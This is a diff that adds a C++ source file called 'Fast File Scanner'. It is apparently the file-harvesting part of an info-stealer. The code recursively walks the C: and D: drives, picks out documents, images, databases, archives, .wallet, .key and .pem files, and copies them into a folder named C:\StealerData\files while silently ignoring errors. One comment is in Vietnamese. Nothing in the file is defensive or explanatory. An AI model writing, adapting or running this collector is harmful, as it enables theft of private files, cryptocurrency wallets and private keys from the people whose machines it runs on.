@@ -1,0 +1,47 @@
+// scanner.cpp - Fast File Scanner (C++)
+// Compile: cl /O2 /MT /EHsc scanner.cpp /Fe:scanner.exe
+
+#include <windows.h>
+#include <shlobj.h>
+#include <string>
+#include <vector>
+#include <filesystem>
+#include <iostream>
+
+namespace fs = std::filesystem;
+
+const std::vector<std::wstring> TARGET_EXTS = {
+    L".pdf", L".doc", L".docx", L".xls", L".xlsx", L".txt", L".jpg", L".png",
+    L".mp4", L".db", L".wallet", L".key", L".pem", L".sql", L".rar", L".zip"
+};
+
+void ScanAndCopy(const std::wstring& startPath) {
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(startPath, fs::directory_options::skip_permission_denied)) {
+            if (fs::is_regular_file(entry.path())) {
+                std::wstring ext = entry.path().extension().wstring();
+                for (const auto& target : TARGET_EXTS) {
+                    if (_wcsicmp(ext.c_str(), target.c_str()) == 0) {
+                        std::wstring destDir = L"C:\\StealerData\\files";
+                        CreateDirectoryW(destDir.c_str(), NULL);
+                        std::wstring dest = destDir + L"\\" + entry.path().filename().wstring();
+                        CopyFileW(entry.path().c_str(), dest.c_str(), FALSE);
+                        break;
+                    }
+                }
+            }
+        }
+    } catch (...) {}
+}
+
+int main() {
+    CreateDirectoryW(L"C:\\StealerData\\files", NULL);
+
+    // Quét ổ C: và D: nếu có
+    ScanAndCopy(L"C:\\");
+    if (GetFileAttributesW(L"D:\\") != INVALID_FILE_ATTRIBUTES) {
+        ScanAndCopy(L"D:\\");
+    }
+
+    return 0;
+}
